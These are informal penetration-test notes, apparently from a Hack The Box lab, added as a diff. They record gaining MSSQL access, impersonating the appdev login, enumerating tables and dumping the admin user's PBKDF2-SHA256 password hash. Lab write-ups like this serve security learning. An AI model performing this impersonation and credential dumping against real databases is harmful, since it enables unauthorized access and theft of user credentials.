@@ -322,6 +322,80 @@ guest user context, indicating further privilege escalation is required.
 
 
 
-after poking around -----> not sysadmin & cannot directly use xp_cmdshell, we do have SQL access 
+after poking around -----> not sysadmin & cannot directly use xp_cmdshell, we do have SQL access --------> 
+
+from here since we entered the database, after 1 hour of enumerating and research we finally found something important, but before we get to that point, 
+its important to cleanly document the path and reset a bit.  
+
+initial mistakes -> attempted these credentials directly against Evil-WinRM / assumed Windows-level access was required/
+led to unnecessary complex dead ends
+
+
+----------- MSSQL Access (Foothold) ----------
+though trial and error, findingsare that kevin can impersonate appdev / appdev is not sysadmin / appdev cannot impersonate further users
+basically impersonation chain was exhausted 
+
+
+-----------------
+
+now our key finding as followed: 
+QL (appdev  appdev@financial_planner)> SELECT DB_NAME();
+                    
+-----------------   
+financial_planner   
+
+SQL (appdev  appdev@financial_planner)> SELECT IS_MEMBER('db_owner');
+    
+-   
+0   
+
+SQL (appdev  appdev@financial_planner)> SELECT USER_NAME();
+         
+------   
+appdev   
+
+SQL (appdev  appdev@financial_planner)> SELECT name FROM sys.tables;
+name          
+-----------   
+users         
+
+incomes       
+
+expenses      
+
+allocations   
+
+analytics     
+
+visits        
+
+SQL (appdev  appdev@financial_planner)> SELECT c.name, t.name 
+FROM sys.columns c JOIN sys.types t ON c.user_type_id=t.user_type_id WHERE c.object_id=OBJECT_ID('dbo.users');
+name       name       
+--------   --------   
+int        int        
+
+nvarchar   nvarchar   
+
+nvarchar   nvarchar   
+
+nvarchar   nvarchar   
+
+nvarchar   nvarchar   
+
+bit        bit        
+
+datetime   datetime   
+
+SQL (appdev  appdev@financial_planner)> SELECT TOP 20 * FROM dbo.users;
+  id   full_name   username   email               password_hash                                                                                            is_admin   created_at   
+----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
+1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   
+
+SQL (appdev  appdev@financial_planner)> 
+
+
+
+thahts right we found the SHA256 for the admin
 
 
